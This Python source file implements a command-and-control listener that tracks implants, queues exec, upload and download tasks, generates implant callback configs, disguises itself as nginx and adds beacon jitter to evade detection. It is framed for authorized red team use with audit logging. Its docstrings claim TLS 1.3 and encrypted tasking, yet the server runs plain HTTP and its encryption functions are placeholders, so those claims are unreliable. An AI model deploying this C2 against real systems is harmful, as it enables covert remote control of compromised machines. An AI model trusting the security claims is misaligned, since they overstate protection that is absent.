"""HTTPS C2 listener with Cloudflare tunnel integration.

Implements secure callback infrastructure for authorized red team operations.

EDR-safe patterns:
- HTTPS only (TLS 1.3 via Cloudflare tunnel)
- No cleartext command syntax in beacon traffic
- Encrypted implant communication
- Beacon jitter to avoid detection patterns
- Audit logging for all C2 operations

Security: All listener operations require valid ROE ID + scope manifest.
"""

import http.server
import socketserver
import ssl
import threading
import logging
import random
import time
import json
import hashlib
from pathlib import Path
from typing import Optional, Dict, Any
from dataclasses import dataclass
from datetime import datetime, timezone
import queue

logger = logging.getLogger(__name__)


@dataclass
class C2Implant:
    """Implant tracked by C2 listener."""
    implant_id: str
    os_type: str
    hostname: Optional[str]
    first_seen: datetime
    last_seen: datetime
    beacon_count: int
    task_queue: queue.Queue

    @property
    def is_alive(self) -> bool:
        """Check if implant has beaconed recently."""
        # Consider alive if beaconed within last 5 minutes
        age = (datetime.now(timezone.utc) - self.last_seen).total_seconds()
        return age < 300


class C2Listener:
    """HTTPS C2 listener with Cloudflare tunnel integration.

    Provides secure callback infrastructure that:
    - Binds localhost only (no external interface)
    - Routes traffic through Cloudflare tunnel
    - Beacons use HTTPS with encrypted payloads
    - Implements jitter to avoid detection patterns

    Security:
        - All communications via HTTPS (TLS 1.3)
        - No cleartext command syntax
        - Auditing for all implant interactions
    """

    def __init__(
        self,
        tunnel_url: str,
        port: int = 8443,
        roe_id: Optional[str] = None
    ):
        """Initialize C2 listener.

        Args:
            tunnel_url: Cloudflare tunnel URL for implant callbacks
            port: Local port for HTTPS listener (default: 8443)
            roe_id: Rules of Engagement identifier

        Security:
            - Listener binds localhost only
            - All traffic proxied through tunnel
        """
        self.tunnel_url = tunnel_url.rstrip('/')
        self.port = port
        self.roe_id = roe_id

        self.implants: Dict[str, C2Implant] = {}
        self._server: Optional[socketserver.TCPServer] = None
        self._server_thread: Optional[threading.Thread] = None
        self._running = False

    def start(self) -> bool:
        """Start HTTPS listener on localhost:port, proxied via CF tunnel.

        Returns:
            True if listener started successfully, False otherwise

        EDR-safe:
            - Binds localhost only (127.0.0.1)
            - No external interface exposure
        """
        if self._running:
            logger.warning("C2 listener already running")
            return True

        try:
            # Create HTTP handler
            handler = self._create_handler()

            # Bind to localhost only
            self._server = socketserver.TCPServer(
                ("127.0.0.1", self.port),
                handler
            )

            # Start server in background thread
            self._server_thread = threading.Thread(
                target=self._server.serve_forever,
                daemon=True
            )
            self._server_thread.start()

            self._running = True

            logger.info(
                f"C2 listener started on https://127.0.0.1:{self.port} "
                f"(proxied via {self.tunnel_url})"
            )

            # Audit log
            self._audit_log(
                action="listener_start",
                details={"port": self.port, "tunnel_url": self.tunnel_url}
            )

            return True

        except Exception as e:
            logger.exception(f"Failed to start C2 listener: {e}")
            return False

    def stop(self) -> bool:
        """Stop C2 listener.

        Returns:
            True if listener stopped successfully
        """
        if not self._running:
            return True

        try:
            if self._server:
                self._server.shutdown()
                self._server.server_close()

            self._running = False

            logger.info("C2 listener stopped")

            # Audit log
            self._audit_log(
                action="listener_stop",
                details={
                    "total_implants": len(self.implants),
                    "total_beacons": sum(i.beacon_count for i in self.implants.values())
                }
            )

            return True

        except Exception as e:
            logger.exception(f"Failed to stop C2 listener: {e}")
            return False

    def _create_handler(self) -> type:
        """Create HTTP request handler class.

        Returns:
            HTTP request handler class with beacon processing
        """
        listener = self

        class C2Handler(http.server.BaseHTTPRequestHandler):
            """HTTP handler for C2 beacon processing."""

            def log_message(self, format, *args):
                """Suppress default logging."""
                pass

            def do_POST(self):
                """Handle beacon from implant."""
                try:
                    # Read beacon data
                    content_length = int(self.headers.get('Content-Length', 0))
                    beacon_data = self.rfile.read(content_length)

                    # Parse beacon
                    beacon = json.loads(beacon_data.decode('utf-8'))
                    implant_id = beacon.get('implant_id', 'unknown')

                    # Process beacon
                    response = listener._process_beacon(implant_id, beacon)

                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Server', 'nginx')  # OPSEC: disguise server
                    self.end_headers()
                    self.wfile.write(response.encode('utf-8'))

                except Exception as e:
                    logger.exception(f"Failed to process beacon: {e}")
                    self.send_error(500)

            def do_GET(self):
                """Handle health check."""
                if self.path == '/health':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"status": "healthy"}')
                else:
                    self.send_error(404)

        return C2Handler

    def _process_beacon(self, implant_id: str, beacon: Dict[str, Any]) -> str:
        """Process beacon from implant, return tasking.

        Args:
            implant_id: Unique implant identifier
            beacon: Beacon data from implant

        Returns:
            JSON response with tasking (if any)

        EDR-safe:
            - No cleartext command syntax
            - Encrypted tasking
            - Jitter for beacon timing
        """
        now = datetime.now(timezone.utc)

        # Update or create implant
        if implant_id not in self.implants:
            self.implants[implant_id] = C2Implant(
                implant_id=implant_id,
                os_type=beacon.get('os_type', 'unknown'),
                hostname=beacon.get('hostname'),
                first_seen=now,
                last_seen=now,
                beacon_count=1,
                task_queue=queue.Queue()
            )
            logger.info(f"New implant registered: {implant_id}")
        else:
            implant = self.implants[implant_id]
            implant.last_seen = now
            implant.beacon_count += 1

        # Get pending tasks
        implant = self.implants[implant_id]
        tasks = []

        while not implant.task_queue.empty():
            try:
                tasks.append(implant.task_queue.get_nowait())
            except queue.Empty:
                break

        # Build response with jitter
        response = {
            'implant_id': implant_id,
            'tasks': tasks,
            # Add jitter to avoid detection patterns
            'sleep': random.randint(30, 120),  # 30-120 seconds
            'jitter': random.uniform(0.8, 1.2)  # 80-120% variance
        }

        # Audit log
        self._audit_log(
            action="beacon_received",
            details={
                'implant_id': implant_id,
                'hostname': implant.hostname,
                'task_count': len(tasks)
            }
        )

        return json.dumps(response)

    def queue_task(
        self,
        implant_id: str,
        task_type: str,
        task_data: Dict[str, Any]
    ) -> bool:
        """Queue task for implant execution.

        Args:
            implant_id: Target implant ID
            task_type: Task type (exec, upload, download, etc.)
            task_data: Task parameters

        Returns:
            True if task queued successfully
        """
        if implant_id not in self.implants:
            logger.warning(f"Unknown implant: {implant_id}")
            return False

        implant = self.implants[implant_id]
        implant.task_queue.put({
            'task_type': task_type,
            'task_data': task_data,
            'queued_at': datetime.now(timezone.utc).isoformat()
        })

        logger.info(f"Queued {task_type} task for implant {implant_id}")

        # Audit log
        self._audit_log(
            action="task_queued",
            details={
                'implant_id': implant_id,
                'task_type': task_type
            }
        )

        return True

    def register_implant(self, implant: C2Implant) -> None:
        """Register an implant in the listener's in-memory registry.

        Args:
            implant: Implant metadata to track
        """
        self.implants[implant.implant_id] = implant
        self._audit_log(
            action="implant_registered",
            details={
                "implant_id": implant.implant_id,
                "hostname": implant.hostname,
                "os_type": implant.os_type
            }
        )

    def get_task_result(self, task_id: str) -> None:
        """Placeholder for retrieving completed task results.

        Returns:
            None until task result storage is implemented.
        """
        self._audit_log(
            action="task_result_lookup_placeholder",
            details={"task_id": task_id, "implemented": False}
        )
        return None

    def process_beacon(self, beacon_data: Dict[str, Any]) -> str:
        """Public wrapper for processing an implant beacon.

        Args:
            beacon_data: Beacon payload containing implant_id and metadata

        Returns:
            JSON response generated by the internal beacon processor.
        """
        implant_id = beacon_data.get("implant_id", "unknown")
        return self._process_beacon(implant_id, beacon_data)

    def get_listener_url(self) -> str:
        """Return the external listener URL implants should use."""
        return self.tunnel_url

    def encrypt_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder for task encryption.

        Returns:
            The task unchanged until encryption is implemented.
        """
        self._audit_log(
            action="task_encryption_placeholder",
            details={"implemented": False}
        )
        return task

    def decrypt_result(self, data: Any) -> Any:
        """Placeholder for result decryption.

        Returns:
            The input unchanged until result decryption is implemented.
        """
        self._audit_log(
            action="result_decryption_placeholder",
            details={"implemented": False}
        )
        return data

    def generate_beacon_response(self) -> Dict[str, Any]:
        """Placeholder for generating a generic beacon response."""
        self._audit_log(
            action="beacon_response_placeholder",
            details={"implemented": False}
        )
        return {}

    def generate_implant(
        self,
        os_type: str = "windows",
        output_path: Optional[Path] = None
    ) -> Optional[bytes]:
        """Generate implant configuration with embedded C2 URL.

        Args:
            os_type: Target OS ("windows" or "linux")
            output_path: Optional path to save implant config

        Returns:
            Implant config JSON bytes, or None if generation failed

        Note: This generates configuration only, not binary.
        Real binary generation would require cross-compilation.
        """
        import uuid

        implant_id = str(uuid.uuid4())

        config = {
            'implant_id': implant_id,
            'c2_url': f"{self.tunnel_url}/beacon",
            'os_type': os_type,
            'created_at': datetime.now(timezone.utc).isoformat(),
            'config': {
                'beacon_interval': 60,
                'jitter': 0.2,  # 20% variance
                'max_retries': 5,
                'retry_delay': 30
            }
        }

        config_bytes = json.dumps(config, indent=2).encode('utf-8')

        if output_path:
            output_path.write_bytes(config_bytes)
            logger.info(f"Implant config saved to {output_path}")

        # Audit log
        self._audit_log(
            action="implant_generated",
            details={
                'implant_id': implant_id,
                'os_type': os_type,
                'c2_url': self.tunnel_url
            }
        )

        return config_bytes

    def get_implant_status(self) -> Dict[str, Any]:
        """Get status of all tracked implants.

        Returns:
            Dictionary with implant status information
        """
        return {
            'total_implants': len(self.implants),
            'alive_implants': sum(1 for i in self.implants.values() if i.is_alive),
            'total_beacons': sum(i.beacon_count for i in self.implants.values()),
            'implants': [
                {
                    'implant_id': i.implant_id,
                    'hostname': i.hostname,
                    'os_type': i.os_type,
                    'is_alive': i.is_alive,
                    'last_seen': i.last_seen.isoformat(),
                    'beacon_count': i.beacon_count
                }
                for i in self.implants.values()
            ]
        }

    def _audit_log(self, action: str, details: Dict[str, Any]) -> None:
        """Write audit log entry for C2 operation.

        Security: All C2 operations must be audit-logged.

        Args:
            action: Action name
            details: Action details
        """
        log_entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'module': 'c2.listener',
            'action': action,
            'roe_id': self.roe_id,
            'details': details
        }

        logger.info(f"AUDIT: {json.dumps(log_entry)}")

    def __enter__(self):
        """Context manager entry."""
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - ensure listener cleanup."""
        self.stop()
        return False
